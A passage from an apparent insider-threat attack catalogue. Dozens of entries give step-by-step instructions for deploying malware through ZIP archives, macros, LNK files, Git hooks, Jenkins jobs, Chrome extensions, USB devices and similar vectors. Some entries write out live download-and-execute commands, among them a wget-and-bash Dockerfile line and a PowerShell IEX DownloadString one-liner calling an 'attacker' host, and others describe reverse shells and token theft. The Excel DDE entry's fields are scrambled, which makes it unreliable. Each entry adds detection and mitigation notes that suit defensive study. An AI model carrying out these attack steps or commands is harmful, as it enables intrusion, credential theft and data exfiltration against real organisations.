- **Tags**: Excel, Named Range, Hidden Script

## Batch Script Inside Zip Archive

- **Attack Type**: Script Dropper Archive
- **Target**: User Devices
- **Vulnerability**: ZIP Archive File Trust
- **MITRE**: T1204.002
- **Impact**: Silent Script Execution
- **Tools**: Notepad, WinRAR
- **Scenario**: Insider sends ZIP archive with a bat file disguised as documentation.
- **Attack Steps**: Step 1: Create a .bat script named Instructions.bat that steals system info.Step 2: Zip it with legit files (e.g., images, PDFs).Step 3: Send or upload as "Event_Guide_2025.zip".Step 4: Recipient unzips and clicks on the bat file.Step 5: Script runs in background and sends data.
- **Detection**: AV inspection of zip, script detection
- **Solution**: Filter zip attachments, scan contents
- **Tags**: ZIP, Archive, Script

## Malicious Shell Script in Docker Container

- **Attack Type**: DevOps Environment Exploit
- **Target**: Dev Servers
- **Vulnerability**: Insecure Container Image
- **MITRE**: T1204.003, T1059
- **Impact**: Container Backdoor
- **Tools**: Dockerfile, Bash
- **Scenario**: Insider adds shell script to Docker entrypoint that launches malware.
- **Attack Steps**: Step 1: Modify Dockerfile to include RUN wget attacker_server/script.sh && bash script.sh.Step 2: Build and push image to internal Docker registry.Step 3: Assign image to backend team for deployment.Step 4: When container starts, malware activates.Step 5: Attacker gains access to host or data inside container.
- **Detection**: Container audit, shell logs
- **Solution**: Scan images, verify builds, container security
- **Tags**: Docker, Container, DevOps

## Script Triggered via .lnk in Startup Folder

- **Attack Type**: Windows Auto-Start Abuse
- **Target**: Office Laptops
- **Vulnerability**: Startup Folder Access
- **MITRE**: T1547.001
- **Impact**: Auto Malware Execution
- **Tools**: .lnk, CMD script
- **Scenario**: Insider places a shortcut to malicious script in user’s Startup folder.
- **Attack Steps**: Step 1: Create a shortcut (.lnk) that runs a command to open malware or logger.Step 2: Navigate to C:\Users\<Name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.Step 3: Paste shortcut inside.Step 4: On reboot, Windows runs the script automatically.Step 5: Malware activates without notice.
- **Detection**: Monitor Startup folders
- **Solution**: Lock write access, alert on shortcut creation
- **Tags**: Startup, LNK, Persistence

## PowerShell One-Liner via Run Dialog

- **Attack Type**: In-Memory Execution
- **Target**: Windows Workstations
- **Vulnerability**: In-Memory Scripting
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: AV Evasion, Credential Theft
- **Tools**: PowerShell
- **Scenario**: Insider uses Win + R run dialog to execute PowerShell that runs in memory.
- **Attack Steps**: Step 1: Press Win + R, type powershell -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')".Step 2: The command runs PowerShell script without saving file to disk.Step 3: Script performs keylogging or opens shell.Step 4: Nothing written on disk; runs from memory only.Step 5: Collect data silently.
- **Detection**: Detect network calls to unknown IPs
- **Solution**: Block PowerShell bypass modes, use AppLocker
- **Tags**: PowerShell, Memory, Stealth

## Fake Antivirus Installer with Payload

- **Attack Type**: Software Installer Abuse
- **Target**: Endpoints
- **Vulnerability**: Unverified Software Install
- **MITRE**: T1204.002
- **Impact**: Remote Access, Control
- **Tools**: Inno Setup, Remote Access Tool
- **Scenario**: Insider sends a fake AV tool bundled with remote access tool.
- **Attack Steps**: Step 1: Create real-looking AV installer interface using packaging software.Step 2: Add backdoor script or install tool like njRAT.Step 3: Distribute as “AntivirusUpdate2025.exe”.Step 4: Victim installs it thinking it’s legit AV.Step 5: Attacker gets remote access.
- **Detection**: Monitor process tree, detect RAT signatures
- **Solution**: Allow only signed software installs
- **Tags**: RAT, Fake AV, Backdoor

## .hta Script via Email

- **Attack Type**: HTML Application Malware
- **Target**: Email Recipients
- **Vulnerability**: HTA Execution
- **MITRE**: T1218.005 (Mshta)
- **Impact**: Silent Malware Execution
- **Tools**: VBScript, .hta file
- **Scenario**: Insider sends .hta file that runs VBScript silently.
- **Attack Steps**: Step 1: Write a VBScript inside .hta file that downloads malware.Step 2: Email it as “Compliance_Review.hta”.Step 3: Target double-clicks file.Step 4: Script runs like a browser but executes system commands.Step 5: Malware installs without popups.
- **Detection**: Block .hta in mail filter
- **Solution**: Disable HTA handler in system
- **Tags**: HTA, VBScript, Email

## Script Triggered from Image EXIF Data

- **Attack Type**: EXIF Abuse
- **Target**: Shared Files
- **Vulnerability**: Script in Metadata
- **MITRE**: T1027.003
- **Impact**: Covert Malware Delivery
- **Tools**: ExifTool, Bash
- **Scenario**: Insider encodes script in EXIF metadata of a photo, extracts & runs locally.
- **Attack Steps**: Step 1: Use ExifTool to write a script into image metadata (e.g., Author field).Step 2: Upload image to shared drive or email.Step 3: On target system, use script to read and execute EXIF content.Step 4: Code runs like normal shell script.Step 5: Hides in plain sight.
- **Detection**: Monitor image files, metadata scanner
- **Solution**: Block EXIF parsing on unknown files
- **Tags**: EXIF, Metadata, Script

## Hidden Script via Desktop Widget

- **Attack Type**: GUI Widget Abuse
- **Target**: Workstations
- **Vulnerability**: Trusted UI Elements
- **MITRE**: T1559.001
- **Impact**: Covert Info Collection
- **Tools**: Electron, Node.js
- **Scenario**: Insider builds a desktop widget app that hides a script behind it.
- **Attack Steps**: Step 1: Build widget like “Weather Checker” in Electron.Step 2: Embed a Node.js script that sends system info.Step 3: Distribute internally for productivity or testing.Step 4: When user runs widget, it also runs script.Step 5: Sends data silently.
- **Detection**: Unusual outbound requests
- **Solution**: Vet GUI apps before internal use
- **Tags**: GUI, Electron, Covert Tool

## Script in Calendar Reminder

- **Attack Type**: Embedded Code in Reminder
- **Target**: Calendar System
- **Vulnerability**: Trust in Calendar Events
- **MITRE**: T1204.001
- **Impact**: Credential Theft or Payload Drop
- **Tools**: Outlook, HTML, PowerShell
- **Scenario**: Insider sets a meeting invite with malicious link or script in description.
- **Attack Steps**: Step 1: Create Outlook meeting invite with title “Security Training”.Step 2: In the description, embed a link to a script or disguised .hta file.Step 3: Invite team members.Step 4: When users click the link or open the file, it runs malicious code.Step 5: Attacker gains access or data.
- **Detection**: Monitor calendar event content
- **Solution**: Disable script links in invites
- **Tags**: Calendar, Outlook, Event Phishing

## JavaScript in Email Signature

- **Attack Type**: Scripted HTML Signature
- **Target**: Email/Webmail
- **Vulnerability**: HTML Signature Misuse
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Webmail Data Theft
- **Tools**: JavaScript, HTML Email
- **Scenario**: Insider adds JavaScript in email signature that activates when emails are opened in browser-based clients.
- **Attack Steps**: Step 1: Edit email signature to include a <script> tag (in HTML view).Step 2: Script logs IP or steals session tokens if webmail doesn’t sanitize content.Step 3: Each email sent triggers the script.Step 4: Collects data or redirects victims.Step 5: Insider controls script remotely.
- **Detection**: Email HTML sanitization logs
- **Solution**: Enforce plaintext signatures
- **Tags**: Email, JS, Webmail Exploit

## Script Executed via Locked Screen

- **Attack Type**: Shortcut Abuse While Locked
- **Target**: Windows Systems
- **Vulnerability**: Global Shortcut Abuse
- **MITRE**: T1059
- **Impact**: Silent Execution
- **Tools**: .lnk, CMD
- **Scenario**: Insider adds a desktop shortcut that runs script using keyboard shortcut from lock screen.
- **Attack Steps**: Step 1: Create .lnk file pointing to malicious script.Step 2: Assign a global keyboard shortcut (e.g., Ctrl+Alt+K).Step 3: Leave system locked but powered on.Step 4: Press shortcut keys from locked screen.Step 5: Script runs silently in background.
- **Detection**: Shortcut log monitoring
- **Solution**: Disable global hotkeys, restrict .lnk
- **Tags**: Lock Screen, Shortcut, Insider

## Network Drive Script Execution

- **Attack Type**: Batch Script via Network Drive
- **Target**: Network Shared Drive
- **Vulnerability**: Unscanned Executables
- **MITRE**: T1204.002
- **Impact**: Privilege Abuse, Data Theft
- **Tools**: .bat, Windows Explorer
- **Scenario**: Insider places malicious script on a mapped network drive and gets coworkers to run it.
- **Attack Steps**: Step 1: Create a .bat script that copies sensitive files or adds new user account.Step 2: Place it in shared department drive.Step 3: Rename as “Monthly_Cleanup_Tool.bat”.Step 4: Ask colleagues to run it.Step 5: Script executes and performs malicious actions.
- **Detection**: Script execution from network logs
- **Solution**: Block .bat from executing over network
- **Tags**: Batch File, Network Drive

## Misuse of Auto-Update Feature

- **Attack Type**: Auto-Update Exploit
- **Target**: Internal Tools
- **Vulnerability**: Insecure Update Process
- **MITRE**: T1505.003
- **Impact**: Backdoor Installation
- **Tools**: Python, Updater Script
- **Scenario**: Insider adds script to an auto-update feature in internal tools.
- **Attack Steps**: Step 1: Locate internal tool with auto-update feature (e.g., update.py).Step 2: Modify script to download and run an additional payload.Step 3: Wait until users run update.Step 4: Update appears normal, but also installs malware.Step 5: Insider maintains persistent access.
- **Detection**: Monitor version file hashes
- **Solution**: Use signed, verified updates
- **Tags**: Auto Update, Script Hook

## Hidden VBS Script via Rename Trick

- **Attack Type**: Fake File Type Attack
- **Target**: Email, Shared Folder
- **Vulnerability**: Hidden File Extension Abuse
- **MITRE**: T1204.002
- **Impact**: Script Execution
- **Tools**: VBScript
- **Scenario**: Insider renames file.vbs as file.txt.vbs and shares with coworkers.
- **Attack Steps**: Step 1: Write a .vbs script that launches calculator or logs keys.Step 2: Rename file to MeetingNotes.txt.vbs.Step 3: Send to coworkers with subject: “Meeting notes attached”.Step 4: Windows may hide known extensions, so it appears as .txt.Step 5: Victim double-clicks and script runs.
- **Detection**: File extension audit
- **Solution**: Show full extensions, block .vbs
- **Tags**: VBS, File Rename, Extension Trick

## Fake Software Crash Prompt

- **Attack Type**: Credential Phishing via GUI
- **Target**: Workstation GUI
- **Vulnerability**: Trust in System Dialogs
- **MITRE**: T1556.002
- **Impact**: Local Credential Theft
- **Tools**: AutoHotKey, GUI script
- **Scenario**: Insider launches fake crash window asking for admin re-login.
- **Attack Steps**: Step 1: Use AutoHotKey to design a window titled “Application Error”.Step 2: Window says “Please re-enter credentials to recover”.Step 3: Capture and save the input to a file.Step 4: Display “System Restored” message.Step 5: Collect stored credentials later.
- **Detection**: Unexpected dialog alerting tools
- **Solution**: Use MFA, educate users
- **Tags**: GUI, Fake Prompt, Credential Theft

## Script Embedded in Voice Assistant Trigger

- **Attack Type**: Voice Command Injection
- **Target**: Smart Devices / Workstation
- **Vulnerability**: Voice-Paired Device Risk
- **MITRE**: T1204.001
- **Impact**: Remote Trigger, Browser Exploit
- **Tools**: Google Assistant, Alexa, Script URL
- **Scenario**: Insider uses smart speaker to trigger script on a paired machine.
- **Attack Steps**: Step 1: Create a command like “OK Google, run meeting script”.Step 2: Configure it to open a URL that triggers malware via browser.Step 3: In an empty room, speak the command aloud.Step 4: If machine is paired, browser opens URL silently.Step 5: Script runs payload.
- **Detection**: Log unexpected URL opens
- **Solution**: Disable unapproved assistant actions
- **Tags**: Voice, Triggered Script, IOT

## Hidden Script in Fonts Folder

- **Attack Type**: System Folder Abuse
- **Target**: Local PC
- **Vulnerability**: Hidden Folder Abuse
- **MITRE**: T1036.005
- **Impact**: Data Theft
- **Tools**: Windows Fonts, .bat
- **Scenario**: Insider places script in Windows Fonts folder, which may be skipped by AV.
- **Attack Steps**: Step 1: Create script named arialsetup.bat that steals files.Step 2: Move it into C:\Windows\Fonts (if permissions allow).Step 3: Trigger execution via scheduled task or shortcut.Step 4: Script runs from hidden location.Step 5: Data is exfiltrated.
- **Detection**: Folder access logs, scan skipped paths
- **Solution**: Lock down hidden system folders
- **Tags**: Hidden Script, Fonts, Obfuscation

## USB Device with Auto Command

- **Attack Type**: BadUSB HID Attack
- **Target**: USB Input Devices
- **Vulnerability**: HID Exploit
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: System Compromise
- **Tools**: Rubber Ducky, Bash Bunny
- **Scenario**: Insider uses a programmable USB device that acts like a keyboard and types commands.
- **Attack Steps**: Step 1: Program USB to simulate keyboard input (e.g., cmd /c powershell commands).Step 2: Plug into system – it types commands automatically.Step 3: Commands run PowerShell to create a new user or upload data.Step 4: Unplug within seconds.Step 5: Attacker gets access or leaves a backdoor.
- **Detection**: Monitor unauthorized USB devices
- **Solution**: Block HID-class devices
- **Tags**: BadUSB, Rubber Ducky, Hardware Attack

## USB Drop Malware Execution

- **Attack Type**: Malicious USB Script
- **Target**: Employee Workstations
- **Vulnerability**: AutoRun Enabled USB ports
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Credential Theft, Persistent Access
- **Tools**: Rubber Ducky, Windows Script
- **Scenario**: An employee drops infected USBs in office or public areas to get someone to plug them into a work computer.
- **Attack Steps**: Step 1: Buy or create a USB that automatically runs a script when plugged in.Step 2: Write a simple script that can steal passwords or install malware silently.Step 3: Drop the USB in office cafeteria or bathroom.Step 4: Another employee picks it up and plugs it in out of curiosity.Step 5: The script runs and installs a backdoor or keylogger.
- **Detection**: Endpoint USB Logging, AV Alerts
- **Solution**: Disable USB AutoRun, Endpoint Control
- **Tags**: USB, Social Engineering, Scripts

## Script via Shared Drive

- **Attack Type**: PowerShell Script Injection
- **Target**: Shared Drive System
- **Vulnerability**: File Execution from Shared Folders
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: Data Exfiltration, Unauthorized Access
- **Tools**: PowerShell, Notepad
- **Scenario**: Insider uploads a PowerShell script disguised as a report in a shared drive.
- **Attack Steps**: Step 1: Write a PowerShell script that steals files or sends data to your email.Step 2: Save the script as a .ps1 or embed it in a .bat file.Step 3: Rename it to "Monthly_Report_Review.bat".Step 4: Upload it to a team’s shared folder.Step 5: Another user downloads and opens it, unknowingly executing the malicious script.
- **Detection**: File Access Logs, Email Alerts
- **Solution**: Educate users, Scan shared drives, Disable .bat/.ps1 auto execution
- **Tags**: PowerShell, Shared Drive, Obfuscation

## Email Attachment Auto-Execution

- **Attack Type**: Script in Excel Macro
- **Target**: HR/Finance Dept
- **Vulnerability**: Macro Auto-Execution
- **MITRE**: T1566.001 (Phishing: Attachment)
- **Impact**: Credential Leak, Surveillance
- **Tools**: MS Excel, VBA Macro
- **Scenario**: Insider sends an Excel sheet with an embedded macro to HR or finance.
- **Attack Steps**: Step 1: Open MS Excel and insert a macro using the developer tab.Step 2: Macro sends data (e.g., email password or screenshot) to attacker email.Step 3: Save the file as “Salary_Breakdown_Q2.xlsm”.Step 4: Email it to HR team saying “Please check the updated file”.Step 5: When HR opens and enables macros, the malicious macro runs.
- **Detection**: Email Gateway Filtering, Macro Alert
- **Solution**: Disable Macros, Use Email Sandboxing
- **Tags**: Macro, HR, Finance, Phishing

## Scheduled Task with Script

- **Attack Type**: Task Scheduler Script Abuse
- **Target**: Local Workstation
- **Vulnerability**: Misconfigured Task Scheduler
- **MITRE**: T1053 (Scheduled Task)
- **Impact**: Persistent Remote Access
- **Tools**: Windows Task Scheduler, Netcat
- **Scenario**: Insider sets up a scheduled task that runs a reverse shell daily at lunch.
- **Attack Steps**: Step 1: Open Task Scheduler on work PC.Step 2: Create a new task that runs a .bat file.Step 3: Inside the bat file, add Netcat command to send remote access back to attacker system.Step 4: Set it to run every day at 1:00 PM when most people are away.Step 5: Wait for connection and collect sensitive data.
- **Detection**: System Task Log Monitoring
- **Solution**: Restrict task creation, Review scheduled tasks
- **Tags**: Task Scheduler, Lateral Access

## Script Injection via Jenkins

- **Attack Type**: CI/CD Script Abuse
- **Target**: DevOps CI/CD
- **Vulnerability**: Weak Job Review in Jenkins
- **MITRE**: T1505.003 (Compromise CI/CD)
- **Impact**: Supply Chain Infection
- **Tools**: Jenkins, Shell Script
- **Scenario**: Insider abuses Jenkins job to run malicious shell commands during a fake update.
- **Attack Steps**: Step 1: Access Jenkins server (insider has dev credentials).Step 2: Go to an existing job or create a new one.Step 3: Insert a shell command to download malware or open a reverse shell.Step 4: Save and execute the job with a title like "Build Patch v1.3".Step 5: Malware gets installed on build server or other linked servers.
- **Detection**: Jenkins Job Audit, Shell Command Log
- **Solution**: Limit Jenkins access, Review jobs regularly
- **Tags**: CI/CD, Jenkins, DevOps, Script

## Malicious Chrome Extension

- **Attack Type**: Browser-Based Script
- **Target**: Employee Browsers
- **Vulnerability**: Browser Extension Permissions
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Data Exfiltration
- **Tools**: JavaScript, Chrome Extension
- **Scenario**: Insider installs or distributes a Chrome extension that steals data from browser sessions.
- **Attack Steps**: Step 1: Find or create a Chrome extension that reads web activity or clipboard.Step 2: Pack it and rename it as a “productivity tool”.Step 3: Share it with teammates via email or file server.Step 4: Ask them to “install for testing”.Step 5: Extension runs and logs sensitive URLs, cookies, or clipboard data.
- **Detection**: Browser Extension Inventory
- **Solution**: Block unverified extensions
- **Tags**: Chrome, JavaScript, Clipboard

## Script via Printer Firmware Update

- **Attack Type**: Peripheral Firmware Abuse
- **Target**: Office Printers
- **Vulnerability**: Unchecked Firmware Updates
- **MITRE**: T1542.001 (Peripheral Firmware)
- **Impact**: Document Theft
- **Tools**: Printer Firmware, Bash
- **Scenario**: Insider modifies printer firmware to run scripts when document is scanned/printed.
- **Attack Steps**: Step 1: Download open-source printer firmware (e.g., for office printer model).Step 2: Insert shell command to upload scanned document to attacker’s FTP.Step 3: Flash modified firmware onto office printer during maintenance.Step 4: When someone scans a doc, it silently sends a copy to the attacker.Step 5: Attacker monitors for classified files.
- **Detection**: Network Printer Traffic Analysis
- **Solution**: Firmware Signing, Access Control
- **Tags**: Printer, Firmware, FTP

## Obfuscated Script via Chat App

- **Attack Type**: Script via Messaging App
- **Target**: Internal Messaging Systems
- **Vulnerability**: Lack of Script Scanning
- **MITRE**: T1059 (Command/Scripting Interpreter)
- **Impact**: System Info Leak
- **Tools**: Python, Slack, Base64
- **Scenario**: Insider sends obfuscated malware via Slack or Teams disguised as a code snippet.
- **Attack Steps**: Step 1: Write a Python or PowerShell script that sends system info to attacker.Step 2: Encode it using Base64 or make it look like a harmless snippet.Step 3: Send it on a dev channel, saying “try this script for debugging”.Step 4: Another dev runs it thinking it’s a helper tool.Step 5: The script runs and sends info outside.
- **Detection**: DLP Tools, Chatbot Filters
- **Solution**: Train users, block file/script transfers
- **Tags**: Chat App, Base64, Dev Team

## Remote Code via Notepad++ Plugin

- **Attack Type**: Plugin Abuse
- **Target**: Developer Machines
- **Vulnerability**: Plugin Trust Assumption
- **MITRE**: T1546.010 (App Plugin)
- **Impact**: Remote Execution
- **Tools**: C++, Notepad++ Plugin SDK
- **Scenario**: Insider creates a plugin for Notepad++ that runs code in background.
- **Attack Steps**: Step 1: Write a plugin that looks like a syntax highlighter.Step 2: In background, add code to run a command or send files.Step 3: Compile and rename it "npp_devtools.dll".Step 4: Share on internal Git or email it with instructions.Step 5: As others install, plugin runs malicious commands silently.
- **Detection**: File Audit, DLL Behavior Logs
- **Solution**: Block unsigned plugins
- **Tags**: Notepad++, Plugin, DLL

## Malicious Shortcut File (LNK)

- **Attack Type**: LNK File Script
- **Target**: Shared Machines
- **Vulnerability**: LNK Execution
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Local Access, Malware Drop
- **Tools**: Windows LNK, CMD, VBScript
- **Scenario**: Insider creates a shortcut file with hidden commands and leaves it on desktop.
- **Attack Steps**: Step 1: Right-click a file and create a shortcut (.lnk).Step 2: Edit shortcut target to run hidden script with icon of a PDF or Excel.Step 3: Name it “Leave_Policy_2025.pdf.lnk”.Step 4: Place on common desktop or USB drive.Step 5: User clicks it and unknowingly executes malware.
- **Detection**: File Scanning, AV Alert
- **Solution**: Hide file extensions, Disable .lnk scripting
- **Tags**: LNK, VBScript, Social Engineering

## Word Macro via Internal Policy Document

- **Attack Type**: Weaponized DOCX
- **Target**: HR Intranet
- **Vulnerability**: Document Macro Abuse
- **MITRE**: T1566.001
- **Impact**: PII Leak, Phishing Setup
- **Tools**: MS Word, VBA, Outlook API
- **Scenario**: Insider adds macro to HR policy document shared across company.
- **Attack Steps**: Step 1: Open Word and add a macro to extract Outlook contacts.Step 2: Save document as “Remote_Work_Policy_2025.docm”.Step 3: Upload to intranet or shared drive.Step 4: When someone opens and enables macro, it sends contact list via email.Step 5: Attacker uses these for spear phishing.
- **Detection**: Macro Execution Logs, DLP
- **Solution**: Block macros from internet docs
- **Tags**: HR, Macro, Word

## Custom Login Script on Kiosk

- **Attack Type**: Script in Login Process
- **Target**: Linux Kiosks
- **Vulnerability**: Login Script Modification
- **MITRE**: T1037.001 (Logon Script)
- **Impact**: Password Harvesting
- **Tools**: Shell Script, Bash, Linux
- **Scenario**: Insider edits login script on a public system (e.g., reception kiosk) to store credentials.
- **Attack Steps**: Step 1: Edit /etc/profile or login script.Step 2: Add command to save entered password to a hidden file.Step 3: Wait for users to log in.Step 4: Collect file later and read credentials.Step 5: Use credentials to access internal systems.
- **Detection**: Bash History, Login Log Review
- **Solution**: Lock login scripts, Use MFA
- **Tags**: Linux, Kiosk, Credentials

## Scripted Screenshot Stealer

- **Attack Type**: Auto Screenshot Capture
- **Target**: Employee Desktop
- **Vulnerability**: Open Script Execution
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Intellectual Property Theft
- **Tools**: Python (pyautogui), Windows
- **Scenario**: Insider runs a script that takes screenshots every few seconds and stores in hidden folder.
- **Attack Steps**: Step 1: Write Python script using pyautogui to take screen every 30s.Step 2: Save in background and store images in a hidden folder.Step 3: Schedule script to run on system boot.Step 4: Let it run silently.Step 5: Later, collect the screenshots via USB or cloud sync.
- **Detection**: Unusual file creation alerts
- **Solution**: Restrict script execution, Monitor task scheduler
- **Tags**: Screenshot, Python, IP Theft

## Git Hook Abuse

- **Attack Type**: Post-Commit Script Injection
- **Target**: Source Code Repos
- **Vulnerability**: Git Hook Abuse
- **MITRE**: T1059 (Shell)
- **Impact**: Code Leak
- **Tools**: Git, Bash
- **Scenario**: Insider adds malicious post-commit hook in team’s Git repo to exfiltrate code on each commit.
- **Attack Steps**: Step 1: Open team repo and go to .git/hooks folder.Step 2: Edit or add a post-commit file that runs curl to send files.Step 3: Push code with hook enabled.Step 4: When team commits code, hook runs and sends files to remote server.Step 5: Attacker gets updated repo outside organization.
- **Detection**: Git Activity Monitor
- **Solution**: Disable local hooks, Audit repo configs
- **Tags**: Git, Bash, Exfil

## Python Script Embedded in Game/App

- **Attack Type**: Trojanized App
- **Target**: Internal Apps
- **Vulnerability**: Lack of Code Review
- **MITRE**: T1204 (User Execution)
- **Impact**: Full System Access
- **Tools**: Python, Tkinter, Socket
- **Scenario**: Insider adds malicious Python code in a team-made internal app/game.
- **Attack Steps**: Step 1: Take a simple office game or tool in Python.Step 2: Embed code that opens a reverse shell or sends keylogs.Step 3: Share app via Slack/email for "fun".Step 4: Others run it casually.Step 5: Script runs and provides remote access.
- **Detection**: Socket Monitoring, Process Scanning
- **Solution**: Code review, Limit app installs
- **Tags**: Python, Internal App, Trojan

## AutoHotKey Keylogger Script

- **Attack Type**: Keyboard Logging via Script
- **Target**: Office PCs
- **Vulnerability**: Script Allowed Execution
- **MITRE**: T1056.001 (Keylogging)
- **Impact**: Credential Theft
- **Tools**: AutoHotKey
- **Scenario**: Insider creates a keylogger using AutoHotKey and runs it on office systems.
- **Attack Steps**: Step 1: Install AutoHotKey (free scripting tool).Step 2: Write a script that logs keystrokes and saves to a file.Step 3: Compile it into an .exe file.Step 4: Run it on the system and minimize the window.Step 5: Collect the file after a day to get all typed passwords.
- **Detection**: Unusual Process Detection
- **Solution**: Disable script engines, Monitor startup scripts
- **Tags**: Keylogger, AutoHotKey, Insider

## Python Reverse Shell via Email

- **Attack Type**: Scripted Shell Access
- **Target**: Internal PC
- **Vulnerability**: Open File Execution
- **MITRE**: T1059.006 (Python)
- **Impact**: Full Remote Access
- **Tools**: Python, Netcat
- **Scenario**: Insider emails a Python file that opens a reverse shell when executed.
- **Attack Steps**: Step 1: Write a Python script to connect back to attacker’s IP on port 4444.Step 2: Email it to a coworker as a “debug tool”.Step 3: Receiver runs it.Step 4: Attacker gets full remote shell to target system.Step 5: Navigate, download or upload files.
- **Detection**: Network Intrusion Alert
- **Solution**: Block outgoing shells, Use sandbox email
- **Tags**: Python, Reverse Shell, Email

## Slack Token Harvester Script

- **Attack Type**: API Token Theft
- **Target**: Browser Cache
- **Vulnerability**: Weak Token Storage
- **MITRE**: T1528 (Cloud Tokens)
- **Impact**: Impersonation, Data Leak
- **Tools**: Python, SQLite
- **Scenario**: Insider writes a script to extract Slack auth tokens from browser files.
- **Attack Steps**: Step 1: Write a Python script to read browser cookie/database files.Step 2: Extract Slack auth token from stored sessions.Step 3: Send it to attacker's email or server.Step 4: Log in as user using stolen token.Step 5: Access Slack messages, files, and channels.
- **Detection**: Session Activity Monitor
- **Solution**: Secure cookie/token storage, MFA
- **Tags**: Slack, Token, Cloud Access

## Fake Software Installer with Script

- **Attack Type**: Trojan Installer
- **Target**: Employee Laptops
- **Vulnerability**: Trust in Internal Files
- **MITRE**: T1204.002
- **Impact**: Persistent Access
- **Tools**: Inno Setup, Python
- **Scenario**: Insider sends a fake installer to a teammate that installs spyware.
- **Attack Steps**: Step 1: Use a software packaging tool (like Inno Setup).Step 2: Bundle a real tool (e.g., Notepad++) with a spyware script.Step 3: Send to team via email saying “use this patched version”.Step 4: When installed, real tool works normally but spyware runs in background.Step 5: It logs activity or opens a backdoor.
- **Detection**: Unusual Background Process Logs
- **Solution**: Verify installers, Use signed software
- **Tags**: Trojan, Installer, Spyware

## Remote Access via Excel DDE

- **Attack Type**: Dynamic Data Exchange Abuse
- **Target**: ‘ /c calc’!A0(DDE technique).<br>Step 2: Replacecalc` with a reverse shell or payload URL.Step 3: Send file to a coworker as “Budget_Dashboard.xls”.Step 4: On opening, Excel prompts user — if accepted, it runs the command.Step 5: Establishes remote access or installs malware.
- **Vulnerability**: Office Suite
- **MITRE**: DDE Execution
- **Impact**: T1220 (XLS DDE)
- **Tools**: MS Excel, DDE
- **Scenario**: Insider crafts Excel file that uses DDE to connect to malicious server.
- **Attack Steps**: Step 1: Open Excel and insert a formula using `=cmd
- **Detection**: Malware Deployment
- **Solution**: User Prompt Detection
- **Tags**: Disable DDE, Block unknown macros

## Hidden Script in Image File

- **Attack Type**: Steganography Malware
- **Target**: File Server
- **Vulnerability**: Steganography
- **MITRE**: T1027.003
- **Impact**: Covert Malware Drop
- **Tools**: Steghide, Bash
- **Scenario**: Insider hides script in image file and extracts/executes it locally.
- **Attack Steps**: Step 1: Use steghide or similar tool to hide script inside .jpg.Step 2: Move image to shared folder or email it.Step 3: On attacker system, extract hidden script.Step 4: Execute the extracted script to steal or upload data.Step 5: Clean evidence and remove image later.
- **Detection**: Monitor image file sizes, Steg-detection tools
- **Solution**: Block .exe/.bat in image payloads
- **Tags**: Steg, Covert, File Share

## Script via QR Code

- **Attack Type**: QR Code Malware
- **Target**: BYOD/Phones
- **Vulnerability**: Trust in QR
- **MITRE**: T1204 (User Execution)
- **Impact**: Credential Phishing
- **Tools**: QR Code Generator
- **Scenario**: Insider embeds script URL in a QR code and prints it around office.
- **Attack Steps**: Step 1: Host a script online (like on pastebin or GitHub).Step 2: Create a QR code that links to the malicious script.Step 3: Print and place in lunch area with text “Scan for coupons!”.Step 4: Curious employees scan using their phone or browser.Step 5: Some scripts download or request sensitive input.
- **Detection**: DNS/URL access alerts
- **Solution**: Train staff, scan QR before use
- **Tags**: QR Code, Phishing, Script URL

## Browser Bookmarklet Attack

- **Attack Type**: JavaScript via Bookmark
- **Target**: Browsers
- **Vulnerability**: Bookmark Execution
- **MITRE**: T1176
- **Impact**: Session Theft
- **Tools**: JavaScript
- **Scenario**: Insider creates a malicious bookmarklet that runs JS in browser.
- **Attack Steps**: Step 1: Write JS that sends cookies or clipboard content to attacker.Step 2: Create a bookmark link like javascript:(function(){...})().Step 3: Share with teammate: “Use this shortcut for debug”.Step 4: Teammate adds it to bookmarks and clicks during use.Step 5: Data gets sent to external server.
- **Detection**: Monitor outgoing requests
- **Solution**: Disable JS in bookmarks
- **Tags**: Bookmarklet, JavaScript, Cookie Theft

## Obfuscated PowerShell in PDF

- **Attack Type**: Script inside PDF
- **Target**: PDF Documents
- **Vulnerability**: Link Script Execution
- **MITRE**: T1059.001
- **Impact**: Malware, Data Exfiltration
- **Tools**: PowerShell, PDF Editor
- **Scenario**: Insider embeds script as a clickable link inside PDF doc.
- **Attack Steps**: Step 1: Use PDF editor to embed clickable content with powershell -EncodedCommand ....Step 2: Distribute document as “WorkFromHome_Policy.pdf”.Step 3: When user clicks link, PowerShell opens and runs the command.Step 4: Script downloads malware or sends data.Step 5: Attacker monitors results.
- **Detection**: PDF Click Logs, PowerShell Alerts
- **Solution**: Block script links in PDFs
- **Tags**: PDF, PowerShell, EncodedCommand

## Windows Registry Persistence Script

- **Attack Type**: Registry Abuse
- **Target**: Windows Systems
- **Vulnerability**: Registry Persistence
- **MITRE**: T1547.001
- **Impact**: Persistent Access
- **Tools**: Regedit, CMD
- **Scenario**: Insider adds script path to Windows startup registry key.
- **Attack Steps**: Step 1: Create or download a malicious script (keylogger, reverse shell).Step 2: Press Win+R, type regedit.Step 3: Go to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.Step 4: Add new entry pointing to script.Step 5: On every reboot, the script runs automatically.
- **Detection**: Registry Change Monitoring
- **Solution**: Lock registry edits, monitor autoruns
- **Tags**: Registry, Persistence, Boot

## Python Script in Screensaver

- **Attack Type**: Scripted Screensaver
- **Target**: Windows Systems
- **Vulnerability**: Screensaver Execution
- **MITRE**: T1059.006 (Python), T1204.002
- **Impact**: Covert Access, Data Theft
- **Tools**: Python, py2exe, SCR compiler
- **Scenario**: Insider embeds malicious Python script in a screensaver file to execute silently.
- **Attack Steps**: Step 1: Write a script that logs user activity or opens a backdoor.Step 2: Convert the script to .exe and rename it with .scr extension.Step 3: Copy it into the Windows screensaver folder or email it as “custom screensaver”.Step 4: When activated, it appears like a normal screensaver but runs hidden script.Step 5: Script sends data or opens a hidden session.
- **Detection**: Monitor .scr file executions
- **Solution**: Block unknown screensavers, restrict folder access
- **Tags**: Screensaver, Python, Hidden Script

## Bash Script in .bashrc File

- **Attack Type**: Shell Script Persistence
